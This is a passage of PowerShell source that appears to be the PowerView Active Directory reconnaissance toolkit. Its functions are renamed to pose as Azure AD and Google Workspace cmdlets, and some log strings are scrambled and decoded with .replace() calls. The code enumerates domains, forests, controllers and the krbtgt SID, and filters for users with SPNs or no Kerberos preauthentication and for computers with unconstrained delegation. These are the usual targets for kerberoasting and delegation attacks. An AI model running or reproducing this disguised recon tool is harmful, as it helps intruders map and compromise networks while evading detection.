                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }
        if ($PSBoundParameters['Properties']) {
            
            $propertiestoload = $Properties| ForEach-Object { $_.Split(',') }
            $null = $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))
        }
        $Searcher
    }
}
function select-azureadgroupidsuserismemberof {
    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            Write-Verbose '[Get-Domain] Using alternate credentials for Get-Domain'
            if ($PSBoundParameters['Domain']) {
                $targetdomain = $Domain
            }
            else {
                
                $targetdomain = $Credential.GetNetworkCredential().Domain
                Write-Verbose "[Get-Domain] Extracted domain '$TargetDomain' from -Credential"
            }
            $domaincontext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Verbose "[Get-Domain] The specified domain '$TargetDomain' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $domaincontext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Verbose "[Get-Domain] The specified domain '$Domain' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[Get-Domain] Error retrieving the current domain: $_"
            }
        }
    }
}
function get-gsuserlicense {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [String]
        $domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $server,
        [Switch]
        $ldap,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $arguments = @{}
        if ($PSBoundParameters['Domain']) { $Arguments['Domain'] = $Domain }
        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }
        if ($PSBoundParameters['LDAP'] -or $PSBoundParameters['Server']) {
            if ($PSBoundParameters['Server']) { $Arguments['Server'] = $Server }
            
            $Arguments['LDAPFilter'] = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
            get-gscalendarresourcelist @Arguments
        }
        else {
            $founddomain = select-azureadgroupidsuserismemberof @Arguments
            if ($FoundDomain) {
                $FoundDomain.DomainControllers
            }
        }
    }
}
function get-azureadmsadministrativeunitmember {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            Write-Verbose "[Gut-#orust] Using  lturn tu cruhunti ls for Gut-#orust".replace('#', 'F').replace(' ', 'a').replace('u', 'e').replace('h', 'd')
            if ($PSBoundParameters['Forest']) {
                $targetforest = $Forest
            }
            else {
                
                $targetforest = $Credential.GetNetworkCredential().Domain
                Write-Verbose "[Get-Forest] Extracted domain '$Forest' from -Credential"
            }
            $forestcontext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $TargetForest, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            try {
                $forestobject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            catch {
                Write-Verbose "[Get-Forest] The specified forest '$TargetForest' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
                $Null
            }
        }
        elseif ($PSBoundParameters['Forest']) {
            $forestcontext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest)
            try {
                $forestobject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            catch {
                Write-Verbose "[Get-Forest] The specified forest '$Forest' does not exist, could not be contacted, or there isn't an existing trust: $_"
                return $Null
            }
        }
        else {
            
            $forestobject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }
        if ($ForestObject) {
            
            if ($PSBoundParameters['Credential']) {
                $forestsid = (new-azureadserviceprincipalkeycredential -Identity "krbtgt" -Domain $ForestObject.RootDomain.Name -Credential $Credential).objectsid
            }
            else {
                $forestsid = (new-azureadserviceprincipalkeycredential -Identity "krbtgt" -Domain $ForestObject.RootDomain.Name).objectsid
            }
            $parts = $ForestSid -Split '-'
            $forestsid = $Parts[0..$($Parts.length-2)] -join '-'
            $ForestObject | Add-Member NoteProperty 'RootDomainSid' $ForestSid
            $ForestObject
        }
    }
}
function new-azureadmsapplicationkey {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $arguments = @{}
        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }
        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }
        $forestobject = get-azureadmsadministrativeunitmember @Arguments
        if ($ForestObject) {
            $ForestObject.Domains
        }
    }
}
function get-azureaddomain {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.PropertyOutlier')]
    [CmdletBinding(DefaultParameterSetName = 'ClassName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ClassName')]
        [Alias('Class')]
        [ValidateSet('User', 'Group', 'Computer')]
        [String]
        $classname,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $referencepropertyset,
        [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = 'ReferenceObject')]
        [PSCustomObject]
        $referenceobject,
        [ValidateNotNullOrEmpty()]
        [String]
        $domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $ldapfilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $searchbase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $searchscope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $resultpagesize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $servertimelimit,
        [Switch]
        $tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $userreferencepropertyset = @('admincount','accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','description', 'displayname','distinguishedname','dscorepropagationdata','givenname','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','lockouttime','logoncount','memberof','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','primarygroupid','pwdlastset','samaccountname','samaccounttype','sn','useraccountcontrol','userprincipalname','usnchanged','usncreated','whenchanged','whencreated')
        $groupreferencepropertyset = @('admincount','cn','description','distinguishedname','dscorepropagationdata','grouptype','instancetype','iscriticalsystemobject','member','memberof','name','objectcategory','objectclass','objectguid','objectsid','samaccountname','samaccounttype','systemflags','usnchanged','usncreated','whenchanged','whencreated')
        $computerreferencepropertyset = @('accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','distinguishedname','dnshostname','dscorepropagationdata','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','localpolicyflags','logoncount','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','operatingsystem','operatingsystemservicepack','operatingsystemversion','primarygroupid','pwdlastset','samaccountname','samaccounttype','serviceprincipalname','useraccountcontrol','usnchanged','usncreated','whenchanged','whencreated')
        $searcherarguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        
        if ($PSBoundParameters['Domain']) {
            if ($PSBoundParameters['Credential']) {
                $targetforest = select-azureadgroupidsuserismemberof -Domain $Domain | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            else {
                $targetforest = select-azureadgroupidsuserismemberof -Domain $Domain -Credential $Credential | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Enumerated forest '$TargetForest' for target domain '$Domain'"
        }
        $schemaarguments = @{}
        if ($PSBoundParameters['Credential']) { $SchemaArguments['Credential'] = $Credential }
        if ($TargetForest) {
            $SchemaArguments['Forest'] = $TargetForest
        }
    }
    PROCESS {
        if ($PSBoundParameters['ReferencePropertySet']) {
            Write-Verbose "[Fhnd-Do ahnObjectPropert#Outlher] Ushng spechfhed -ReferencePropert#Set".replace('#', 'y').replace(' ', 'm').replace('h', 'i')
            $referenceobjectproperties = $ReferencePropertySet
        }
        elseif ($PSBoundParameters['ReferenceObject']) {
            Write-Verbose "[Find-Do ainObjectPropert#Outlier] Extracting propert# na es fro  -ReferenceObject to use as the reference propert# set".replace('#', 'y').replace(' ', 'm')
            $referenceobjectproperties = Get-Member -InputObject $ReferenceObject -MemberType NoteProperty | Select-Object -Expand Name
            $referenceobjectclass = $ReferenceObject.objectclass | Select-Object -Last 1
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Calculated ReferenceObjectClass : $ReferenceObjectClass"
        }
        else {
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Using the default reference property set for the object class '$ClassName'"
        }
        if (($ClassName -eq 'User') -or ($ReferenceObjectClass -eq 'User')) {
            $objects = new-azureadserviceprincipalkeycredential @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $referenceobjectproperties = $UserReferencePropertySet
            }
        }
        elseif (($ClassName -eq 'Group') -or ($ReferenceObjectClass -eq 'Group')) {
            $objects = set-azureadmsgroup @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $referenceobjectproperties = $GroupReferencePropertySet
            }
        }
        elseif (($ClassName -eq 'Computer') -or ($ReferenceObjectClass -eq 'Computer')) {
            $objects = get-gscalendarresourcelist @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $referenceobjectproperties = $ComputerReferencePropertySet
            }
        }
        else {
            throw "[Find-DomainObjectPropertyOutlier] Invalid class: $ClassName"
        }
        ForEach ($Object in $Objects) {
            $objectproperties = Get-Member -InputObject $Object -MemberType NoteProperty | Select-Object -Expand Name
            ForEach($ObjectProperty in $ObjectProperties) {
                if ($ReferenceObjectProperties -NotContains $ObjectProperty) {
                    $out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'SamAccountName' $Object.SamAccountName
                    $Out | Add-Member Noteproperty 'Property' $ObjectProperty
                    $Out | Add-Member Noteproperty 'Value' $Object.$ObjectProperty
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.PropertyOutlier')
                    $Out
                }
            }
        }
    }
}
function new-azureadserviceprincipalkeycredential {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $identity,
        [Switch]
        $spn,
        [Switch]
        $admincount,
        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $allowdelegation,
        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $disallowdelegation,
        [Switch]
        $trustedtoauth,
        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $preauthnotrequired,
        [ValidateNotNullOrEmpty()]
        [String]
        $domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $ldapfilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $searchbase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $searchscope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $resultpagesize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $servertimelimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $securitymasks,
        [Switch]
        $tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $findone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $raw
    )
    DynamicParam {
        $uacvaluenames = [Enum]::GetNames($UACEnum)
        
        $uacvaluenames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        
        new-azureadtrustedcertificateauthority -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }
    BEGIN {
        $searcherarguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $usersearcher = set-azureaddevice @SearcherArguments
    }
    PROCESS {
      
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            new-azureadtrustedcertificateauthority -CreateVariables -BoundParameters $PSBoundParameters
        }
        if ($UserSearcher) {
            $identityfilter = ''
            $filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $identityinstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^CN=') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        
                        
                        $identitydomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainUser] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $usersearcher = set-azureaddevice @SearcherArguments
                        if (-not $UserSearcher) {
                            Write-Warning "[Get-DomainUser] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $guidbytestring = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('\')) {
                    $convertedidentityinstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | set-azureadapplicationproxyapplicationconnectorgroup -OutputType Canonical
                    if ($ConvertedIdentityInstance) {
                        $userdomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                        $username = $IdentityInstance.Split('\')[1]
                        $IdentityFilter += "(samAccountName=$UserName)"
                        $SearcherArguments['Domain'] = $UserDomain
                        Write-Verbose "[Get-DomainUser] Extracted domain '$UserDomain' from '$IdentityInstance'"
                        $usersearcher = set-azureaddevice @SearcherArguments
                    }
                }
                else {
                    $IdentityFilter += "(samAccountName=$IdentityInstance)"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[Get-DomainUser] Searching for non-null service principal names'
                $Filter += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[Get-DomainUser] Searching for users who can be delegated'
                
                $Filter += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[Get-DomainUser] Searching for users who are sensitive and not trusted for delegation'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[Get-DomainUser] Searching for adminCount=1'
                $Filter += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[Get-DomainUser] Searching for users that are trusted to authenticate for other principals'
                $Filter += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[Get-DomainUser] Searching for user accounts that do not require kerberos preauthenticate'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainUser] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }
            
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $uacfield = $_.Substring(4)
                    $uacvalue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $uacvalue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }
            $UserSearcher.filter = "(&(samAccountType=805306368)$Filter)"
            Write-Verbose "[Get-DomainUser] filter string: $($UserSearcher.filter)"
            if ($PSBoundParameters['FindOne']) { $results = $UserSearcher.FindOne() }
            else { $results = $UserSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    
                    $user = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $user = get-azureadcurrentsessioninfo -Properties $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainUser] Error disposing of the Results object: $_"
                }
            }
            $UserSearcher.dispose()
        }
    }
}
function get-gscalendarresourcelist {
    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        $identity,
        [Switch]
        $unconstrained,
        [Switch]
        $trustedtoauth,
        [Switch]
        $printers,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        $spn,
        [ValidateNotNullOrEmpty()]
        [String]
        $operatingsystem,
        [ValidateNotNullOrEmpty()]
        [String]
        $servicepack,
        [ValidateNotNullOrEmpty()]
        [String]
        $sitename,
        [Switch]
        $ping,
        [ValidateNotNullOrEmpty()]
        [String]
        $domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $ldapfilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $searchbase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $searchscope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $resultpagesize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $servertimelimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $securitymasks,
        [Switch]
        $tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $findone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $raw
    )
    DynamicParam {
        $uacvaluenames = [Enum]::GetNames($UACEnum)
        
        $uacvaluenames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        
        new-azureadtrustedcertificateauthority -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }
    BEGIN {
        $searcherarguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $compsearcher = set-azureaddevice @SearcherArguments
    }
    PROCESS {
        
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            new-azureadtrustedcertificateauthority -CreateVariables -BoundParameters $PSBoundParameters
        }
        if ($CompSearcher) {
            $identityfilter = ''
            $filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $identityinstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^CN=') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        
                        
                        $identitydomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainComputer] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $compsearcher = set-azureaddevice @SearcherArguments
                        if (-not $CompSearcher) {
                            Write-Warning "[Get-DomainComputer] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $guidbytestring = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                else {
                    $IdentityFilter += "(name=$IdentityInstance)"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }
            if ($PSBoundParameters['Unconstrained']) {
                Write-Verbose '[Get-DomainComputer] Searching for computers with for unconstrained delegation'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[Get-DomainComputer] Searching for computers that are trusted to authenticate for other principals'
                $Filter += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['Printers']) {
                Write-Verbose '[Get-DomainComputer] Searching for printers'
                $Filter += '(objectCategory=printQueue)'
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with SPN: $SPN"
                $Filter += "(servicePrincipalName=$SPN)"
            }
            if ($PSBoundParameters['OperatingSystem']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with operating system: $OperatingSystem"
                $Filter += "(operatingsystem=$OperatingSystem)"
            }
            if ($PSBoundParameters['ServicePack']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with service pack: $ServicePack"
                $Filter += "(operatingsystemservicepack=$ServicePack)"
            }
            if ($PSBoundParameters['SiteName']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with site name: $SiteName"
                $Filter += "(serverreferencebl=$SiteName)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainComputer] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }
            
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $uacfield = $_.Substring(4)
                    $uacvalue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $uacvalue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }
            $CompSearcher.filter = "(&(samAccountType=805306369)$Filter)"
            Write-Verbose "[Get-DomainComputer] Get-DomainComputer filter string: $($CompSearcher.filter)"
            if ($PSBoundParameters['FindOne']) { $results = $CompSearcher.FindOne() }
            else { $results = $CompSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                $up = $True
                if ($PSBoundParameters['Ping']) {
                    $up = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                }
                if ($Up) {
                    if ($PSBoundParameters['Raw']) {
                        
                        $computer = $_
                        $Computer.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')
                    }
                    else {
                        $computer = get-azureadcurrentsessioninfo -Properties $_.Properties
                        $Computer.PSObject.TypeNames.Insert(0, 'PowerView.Computer')
                    }
                    $Computer
                }
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainComputer] Error disposing of the Results object: $_"
                }
            }
            $CompSearcher.dispose()
        }
    }
}
function set-azureadmsauthorizationpolicy {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $identity,
        [Switch]
        $sacl,
        [Switch]
        $resolveguids,
        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $rightsfilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $ldapfilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $searchbase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $searchscope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $resultpagesize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $servertimelimit,
        [Switch]
        $tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $searcherarguments = @{
            'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'
        }
        if ($PSBoundParameters['Sacl']) {
            $SearcherArguments['SecurityMasks'] = 'Sacl'
        }
        else {
            $SearcherArguments['SecurityMasks'] = 'Dacl'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
